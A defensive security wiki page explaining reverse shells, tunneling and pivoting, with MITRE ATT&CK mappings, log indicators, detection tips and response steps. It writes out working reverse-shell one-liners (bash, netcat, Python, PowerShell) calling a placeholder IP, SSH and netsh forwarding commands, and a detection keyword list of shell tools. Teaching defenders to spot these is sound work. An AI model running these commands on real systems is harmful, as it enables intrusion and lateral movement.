<sub>[Home](../README.md) › [Network attacks](README.md)</sub>

# Reverse shells, tunneling and pivoting

> **In one line:** The attacker makes a compromised machine **connect out** to give them a shell, then uses it as a **relay (pivot)** to reach internal systems they couldn't reach directly.

| **MITRE ATT&CK** | [T1059 Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/), [T1572 Protocol Tunneling](https://attack.mitre.org/techniques/T1572/), [T1090.001 Internal Proxy](https://attack.mitre.org/techniques/T1090/001/), [T1021.004 SSH](https://attack.mitre.org/techniques/T1021/004/) |
|---|---|
| **Tactics** | Execution, Command and Control, Lateral Movement |
| **Common tools** | netcat, bash, socat, `ssh -L/-R/-D`, chisel, ligolo-ng, ngrok, Cloudflare Tunnel, plink |

## Bind shell vs reverse shell

| | Bind shell | Reverse shell |
|---|---|---|
| **Who connects** | Attacker → victim (victim listens on a port) | **Victim → attacker** |
| **Firewall** | Usually blocked (inbound) | Usually **allowed** (outbound) |
| **Used** | Rarely today | Almost always |

**Common one-liners** (what you'll see in command lines):

```bash
bash -i >& /dev/tcp/203.0.113.9/4444 0>&1
nc -e /bin/sh 203.0.113.9 4444
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("203.0.113.9",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("sh")'
```

```powershell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('203.0.113.9',443);..."
```

## Tunneling and pivoting

| Technique | Command | What it does |
|---|---|---|
| **SSH local forward** | `ssh -L 8080:10.0.0.5:80 user@pivot` | Attacker's port 8080 → internal host 10.0.0.5:80, through the pivot |
| **SSH remote forward** | `ssh -R 9000:localhost:3389 attacker@vps` | Victim exposes its RDP **out** to the attacker's VPS |
| **SSH dynamic (SOCKS)** | `ssh -D 1080 user@pivot` | A SOCKS proxy: any attacker tool can reach the whole internal network |
| **HTTP tunnels** | chisel, ligolo-ng | Tunnel traffic over HTTP/HTTPS/WebSocket to pass proxies |
| **Legit tunnel services** | ngrok, Cloudflare Tunnel, VS Code tunnels | Expose internal services to the internet through trusted domains |
| **Windows port forward** | `netsh interface portproxy add v4tov4 ...` | Host forwards a port to another internal host |

## What you see in logs

| Log source | What to look for |
|---|---|
| Sysmon 1 / auditd | `/dev/tcp/`, `nc -e`, `ncat`, `socat`, `pty.spawn`, `TCPClient(` in command lines; `ssh -R` / `-D` from servers |
| Sysmon 1 | `plink.exe`, `chisel`, `ngrok`, `cloudflared` on endpoints or servers; `netsh interface portproxy` |
| EDR / Sysmon 1 | **Shell process whose parent is a web server or a service** (`www-data` → `bash`) |
| Sysmon 3 / firewall | Shell or script process with an **outbound connection**; long-lived connections to an external IP on 4444, 443, 53, 8080 |
| Registry | `HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4` entries |
| Network | Internal hosts reached from a machine that never talks to them (the pivot) |

## How to detect it

- Shell interpreters (`bash`, `sh`, `cmd`, `powershell`) holding **network sockets**.
- Tunneling tools and services that aren't approved.
- Workstations or DMZ servers initiating connections to internal segments they never use.

## How to respond

1. **Isolate** the host running the shell or tunnel; block the remote IP / tunnel domain.
2. Map which internal systems were reached **through** the pivot and investigate each.
3. Remove port proxies, SSH keys and tunnel services the attacker set up.
4. **Fix:** strict egress filtering (servers shouldn't connect to arbitrary internet IPs), block unapproved tunnel services, segment networks so one host can't reach everything.

## References

- [MITRE ATT&CK T1572](https://attack.mitre.org/techniques/T1572/)
- [MITRE ATT&CK T1090.001](https://attack.mitre.org/techniques/T1090/001/)

---

| [← C2 beaconing](c2-beaconing.md) | [Home](../README.md) | [Post-exploitation →](../post-exploitation/README.md) |
|:---|:---:|---:|
